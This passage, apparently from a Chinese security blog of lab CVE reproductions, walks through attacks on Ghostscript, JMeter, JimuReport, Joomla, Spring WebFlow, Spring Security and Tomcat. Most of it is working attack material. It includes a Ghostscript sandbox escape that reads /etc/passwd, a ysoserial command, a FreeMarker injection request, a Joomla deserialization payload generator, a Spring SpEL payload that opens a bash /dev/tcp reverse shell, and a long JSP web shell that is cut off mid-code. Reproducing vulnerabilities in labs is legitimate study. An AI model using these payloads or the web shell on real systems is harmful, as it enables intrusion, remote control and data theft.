shouldnt have access to.</span><br><span class="line">(/etc/passwd) (r) file dup 64 string readline pop == closefile</span><br><span class="line"></span><br><span class="line">(Attempting to execute a shell command...)= flush</span><br><span class="line"></span><br><span class="line">% run command</span><br><span class="line">(%pipe%id &gt; /tmp/success) (w) file closefile</span><br><span class="line"></span><br><span class="line">(All done.)=</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031014998.png" alt="image-20240703101452954"></p>
<p><code>/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</code>: 从 <code>pdfdict</code> 字典中提取 <code>.actual_pdfpaintproc</code> 操作符并定义它。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031014134.png"></p>
<p><code>/exploit</code>: 定义一个名为 <code>exploit</code> 的过程。</p>
<p><code>(Stage 11: Exploitation...)=</code>: 输出一个调试信息，指示当前阶段。</p>
<p><code>/forceput exch def</code>: 定义 <code>forceput</code>。</p>
<p><code>systemdict /SAFER false forceput</code>: 禁用 <code>SAFER</code> 模式。</p>
<p><code>userparams /LockFilePermissions false forceput</code>: 取消文件权限锁定。</p>
<p><code>systemdict /userparams get /PermitFileControl [(\*)] forceput</code>: 允许文件控制。</p>
<p><code>systemdict /userparams get /PermitFileWriting [(\*)] forceput</code>: 允许文件写入。</p>
<p><code>systemdict /userparams get /PermitFileReading [(\*)] forceput</code>: 允许文件读取。</p>
<p><code>save restore</code>: 更新状态。</p>
<p><code>stop</code>: 停止执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031015391.png" alt="image-20240703101527352"></p>
<p><code>errordict /typecheck</code>: 修改 <code>typecheck</code> 错误处理。</p>
<p><code>/typecount typecount 1 add def</code>: 递增 <code>typecount</code>。</p>
<p><code>(Stage 10: /typecheck #)=only typecount ==</code>: 输出调试信息。</p>
<p><code>typecount 1 eq &#123; null &#125; if</code>: 如果 <code>typecount</code> 等于 1，则执行空操作。</p>
<p><code>typecount 2 eq &#123; pop 7 get exploit &#125; if</code>: 如果 <code>typecount</code> 等于 2，执行 <code>exploit</code> 过程。</p>
<p><code>typecount 3 eq &#123; (unexpected)= quit &#125; if</code>: 如果 <code>typecount</code> 等于 3，输出 <code>unexpected</code> 并退出。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031016244.png" alt="image-20240703101629197"></p>
<p>字典定义和错误触发: 定义一个包含多个过程的字典，这些过程在执行时将触发 <code>typecheck</code> 错误，从而执行 <code>exploit</code> 过程。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031017167.png" alt="image-20240703101710120"></p>
<p><strong>实际执行命令</strong>:</p>
<p><code>(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=</code>: 输出调试信息。</p>
<p><code>(/etc/passwd) (r) file dup 64 string readline pop == closefile</code>: 读取 <code>/etc/passwd</code> 文件内容并输出。</p>
<p><code>(Attempting to execute a shell command...)= flush</code>: 输出调试信息并刷新输出缓冲。</p>
<p><code>(%pipe%id &gt; /tmp/success) (w) file closefile</code>: 执行 <code>id</code> 命令并将结果写入 <code>/tmp/success</code> 文件。</p>
<p><code>(All done.)=</code>: 输出调试信息。</p>
<p><code>quit</code>: 退出。</p>

        <h1 id="jmeter"   >
          <a href="#jmeter" class="heading-link"><i class="fas fa-link"></i></a><a href="#jmeter" class="headerlink" title="jmeter"></a>jmeter</h1>
      
        <h2 id="Apache-JMeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）"   >
          <a href="#Apache-JMeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apache-JMeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）" class="headerlink" title="Apache JMeter RMI 反序列化命令执行漏洞（CVE-2018-1297）"></a>Apache JMeter RMI 反序列化命令执行漏洞（CVE-2018-1297）</h2>
      <p>其2.x版本和3.x版本中存在反序列化漏洞，攻击者可以利用该漏洞在目标服务器上执行任意命令。</p>
<p>运行完成后将启动一个RMI服务并监听1099端口</p>
<p>使用ysoserial</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></div></figure>

<p>进入容器查看文件即可验证</p>

        <h1 id="jimureport"   >
          <a href="#jimureport" class="heading-link"><i class="fas fa-link"></i></a><a href="#jimureport" class="headerlink" title="jimureport"></a>jimureport</h1>
      
        <h2 id="JimuReport-FreeMarker服务端模板注入命令执行CVE-2023-4450"   >
          <a href="#JimuReport-FreeMarker服务端模板注入命令执行CVE-2023-4450" class="heading-link"><i class="fas fa-link"></i></a><a href="#JimuReport-FreeMarker服务端模板注入命令执行CVE-2023-4450" class="headerlink" title="JimuReport FreeMarker服务端模板注入命令执行CVE-2023-4450"></a>JimuReport FreeMarker服务端模板注入命令执行CVE-2023-4450</h2>
      <p>由于未授权的 API <code>/jmreport/queryFieldBySql</code> 使用了 freemarker 解析 SQL 语句从而导致了 RCE 漏洞的产生。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011522226.png" alt="image-20240701152157955"></p>
<p>随便选一个模板进行设计并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011641518.png" alt="image-20240701164158470"></p>
<p>将请求包修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /jmreport/queryFieldBySql HTTP/1.1</span><br><span class="line">Host: your-ip:8085</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.162.131:8085/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: adminer_permanent=; Hm_lvt_b756a4a8e1c58d613e27d1459c6d6076=1719818398; Hm_lpvt_b756a4a8e1c58d613e27d1459c6d6076=1719823231</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123;ex(\&quot;id\&quot;)&#125;&#x27;&quot; &#125;</span><br></pre></td></tr></table></div></figure>

<p><code>id</code>命令成功执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011643580.png" alt="image-20240701164328527"></p>

        <h1 id="Joomla"   >
          <a href="#Joomla" class="heading-link"><i class="fas fa-link"></i></a><a href="#Joomla" class="headerlink" title="Joomla"></a>Joomla</h1>
      
        <h2 id="Joomla-3-4-5反序列化漏洞CVE-2015-8562"   >
          <a href="#Joomla-3-4-5反序列化漏洞CVE-2015-8562" class="heading-link"><i class="fas fa-link"></i></a><a href="#Joomla-3-4-5反序列化漏洞CVE-2015-8562" class="headerlink" title="Joomla 3.4.5反序列化漏洞CVE-2015-8562"></a>Joomla 3.4.5反序列化漏洞CVE-2015-8562</h2>
      <p>PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p>
<p>通过Joomla中的Gadget，可造成任意代码执行的结果。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011715518.png" alt="image-20240701171506374"></p>
<p>抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011718765.png" alt="image-20240701171838720"></p>
<p>删掉<code>User-Agent</code>和<code>Cookie</code>字段，发包，得到返回包的cookie</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021413886.png" alt="image-20240702141300767"></p>
<p>用脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class JSimplepieFactory &#123;</span><br><span class="line">&#125;</span><br><span class="line">class JDatabaseDriverMysql &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class SimplePie &#123;</span><br><span class="line">    var $sanitize;</span><br><span class="line">    var $cache;</span><br><span class="line">    var $cache_name_function;</span><br><span class="line">    var $javascript;</span><br><span class="line">    var $feed_url;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class="line">        $this-&gt;javascript = 9999;</span><br><span class="line">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class="line">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class="line">        $this-&gt;cache = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JDatabaseDriverMysqli &#123;</span><br><span class="line">    protected $a;</span><br><span class="line">    protected $disconnectHandlers;</span><br><span class="line">    protected $connection;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = new JSimplepieFactory();</span><br><span class="line">        $x = new SimplePie();</span><br><span class="line">        $this-&gt;connection = 1;</span><br><span class="line">        $this-&gt;disconnectHandlers = [</span><br><span class="line">            [$x, &quot;init&quot;],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new JDatabaseDriverMysqli();</span><br><span class="line">$poc = serialize($a); </span><br><span class="line"></span><br><span class="line">$poc = str_replace(&quot;\x00*\x00&quot;, &#x27;\\0\\0\\0&#x27;, $poc);</span><br><span class="line"></span><br><span class="line">echo &quot;123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86&quot;;</span><br></pre></td></tr></table></div></figure>

<p>这个脚本的主要目的是创建一个可以用于PHP对象反序列化攻击的有效负载。当目标系统反序列化这个对象时，如果目标系统的代码存在反序列化漏洞并且允许执行<code>assert</code>函数，它将会执行序列化对象中定义的PHP代码<code>phpinfo();JFactory::getConfig();exit;</code>，导致代码执行</p>
<p>生成POC如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;𝌆</span><br></pre></td></tr></table></div></figure>

<p>添加<code>User-Agent</code>和<code>Cookie</code>字段,生成好的POC作为<code>User-Agent</code>，带上第一步获取的Cookie发包，这一次发包，脏数据进入Mysql数据库。然后同样的包再发一次，代码被执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021413420.png" alt="image-20240702141339367"></p>

        <h1 id="Spring"   >
          <a href="#Spring" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1>
      
        <h2 id="Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"   >
          <a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）"></a>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</h2>
      <p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271554889.png" alt="image-20240627155407752"></p>
<p>点击上面的”Login”，从左边任选一个用户进行登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271555671.png" alt="image-20240627155534561"></p>
<p>随意输入一个编号查询酒店</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271556761.png" alt="image-20240627155646655"></p>
<p>比如这里输入2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271558440.png" alt="image-20240627155827337"></p>
<p>选择第一个酒店，点击“View Hotel”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271558763.png" alt="image-20240627155859648"></p>
<p>点击“Book Hotel”，填写相关信息后点击“Proceed”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271600653.png" alt="image-20240627160051543"></p>
<p>点击“Confirm”确认，并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271601362.png" alt="image-20240627160146313"></p>

        <h5 id="漏洞验证"   >
          <a href="#漏洞验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5>
      <p>抓到一个POST数据包，添加内容</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</span><br></pre></td></tr></table></div></figure>

<p>返回响应头中包含<code>vulnerable: True</code>, 验证漏洞</p>

        <h5 id="反弹shell"   >
          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5>
      <p>重新抓包添加内容</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;_(new+java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/your-ip/10086+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></div></figure>

<p>（这里应该是对空格和某些字符进行了一定的处理，所以用了url编码处理了一些）</p>
<p>开启一个端口10086</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 10086</span><br></pre></td></tr></table></div></figure>

<p>然后发包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406271651353.png" alt="image-20240627165105291"></p>
<p>成功拿到shell</p>

        <h2 id="Spring-Security身份验证绕过漏洞-CVE-2022-22978"   >
          <a href="#Spring-Security身份验证绕过漏洞-CVE-2022-22978" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring-Security身份验证绕过漏洞-CVE-2022-22978" class="headerlink" title="Spring Security身份验证绕过漏洞(CVE-2022-22978)"></a>Spring Security身份验证绕过漏洞(CVE-2022-22978)</h2>
      <p>在Spring Security 5.5.7之前、5.6.4 之前以及不受支持的旧版本中，使用正则表达式中包含”. “的RegexRequestMatcher的应用程序易被换行符\r（%0a）、回车符\n（%0d）绕过，可利用此漏洞在未授权的情况下绕过身份认证，导致配置的权限验证失效。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090933638.png" alt="image-20240709093335510"></p>
<p>（payload直接就给了）</p>
<p>点击<code>/admin/</code>链接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090935420.png" alt="image-20240709093530380"></p>
<p>在url中拼接管理员目录/admin以及换行符%0a或回车符%d后向目标url发起攻击</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br><span class="line">/admin/%0a%0d</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407090945972.png" alt="image-20240709094552912"></p>

        <h1 id="Tomcat"   >
          <a href="#Tomcat" class="heading-link"><i class="fas fa-link"></i></a><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1>
      
        <h2 id="CVE-2017-12615"   >
          <a href="#CVE-2017-12615" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2>
      <p>当 Tomcat 运行在Windows主机上，且启用了<code>PUT</code>请求方法（例如，将 readonly 初始化参数由默认值设置为 ftalse），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件。之后，JSP文件中的代码将能被服务器执行。 </p>
<p>通过以上两个漏洞可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202406140947337.png" alt="image-20240614094720183"></p>
<p>抓包发送到Repeater，<code>GET</code>修改为<code>PUT</code>，添加文件3.jsp，发包后显示201即为上传成功</p>
<p>文件内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;</span><br><span class="line">&lt;%!String Pwd = &quot;pass&quot;;</span><br><span class="line"></span><br><span class="line">    String EC(String s, String c) throws Exception &#123;</span><br><span class="line">        return s;</span><br><span class="line">    &#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;</span><br><span class="line"></span><br><span class="line">    Connection GC(String s) throws Exception &#123;</span><br><span class="line">        String[] x = s.trim().split(&quot;\r\n&quot;);</span><br><span class="line">        Class.forName(x[0].trim()).newInstance();</span><br><span class="line">        Connection c = DriverManager.getConnection(x[1].trim());</span><br><span class="line">        if (x.length &gt; 2) &#123;</span><br><span class="line">            c.setCatalog(x[2].trim());</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void AA(StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File r[] = File.listRoots();</span><br><span class="line">        for (int i = 0; i &lt; r.length; i++) &#123;</span><br><span class="line">            sb.append(r[i].toString().substring(0, 2));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void BB(String s, StringBuffer sb) throws Exception &#123;</span><br><span class="line">        File oF = new File(s), l[] = oF.listFiles();</span><br><span class="line">        String sT, sQ, sF = &quot;&quot;;</span><br><span class="line">        java.util.Date dt;</span><br><span class="line">        SimpleDateFormat fm = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);</span><br><span class="line">        for (int i = 0; i &lt; l.length; i++) &#123;</span><br><span class="line">            dt = new java.util.Date(l[i].lastModified());</span><br><span class="line">            sT = fm.format(dt);</span><br><span class="line">            sQ = l[i].canRead() ? &quot;R&quot; : &quot;&quot;;</span><br><span class="line">            sQ += l[i].canWrite() ? &quot; W&quot; : &quot;&quot;;</span><br><span class="line">            if (l[i].isDirectory()) &#123;</span><br><span class="line">                sb.append(l[i].getName() + &quot;/\t&quot; + sT + &quot;\t&quot; + l[i].length()</span><br><span class="line">                        + &quot;\t&quot; + sQ + &quot;\n&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                sF += l[i].getName() + &quot;\t&quot; + sT + &quot;\t&quot; + l[i].length() + &quot;\t&quot;</span><br><span class="line">                        + sQ + &quot;\n&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sb.append(sF);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void EE(String s) throws Exception &#123;</span><br><span class="line">        File f = new File(s);</span><br><span class="line">        if (f.isDirectory()) &#123;</span><br><span class="line">            File x[] = f.listFiles();</span><br><span class="line">            for (int k = 0; k &lt; x.length; k++) &#123;</span><br><span class="line">                if (!x[k].delete()) &#123;</span><br><span class="line">                    EE(x[k].getPath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void FF(String s, HttpServletResponse r) throws Exception &#123;</span><br><span class="line">        int n;</span><br><span class="line">        byte[] b = new byte[512];</span><br><span class="line">        r.reset();</span><br><span class="line">        ServletOutputStream os = r.getOutputStream();</span><br><span class="line">        BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));</span><br><span class="line">        os.write((&quot;-&gt;&quot; + &quot;|&quot;).getBytes(), 0, 3);</span><br><span class="line">        while ((n = is.read(b, 0, 512)) != -1) &#123;</span><br><span class="line">            os.write(b, 0, n);</span><br><span class="line">        &#125;</span><br><span class="line">        os.write((&quot;|&quot; + 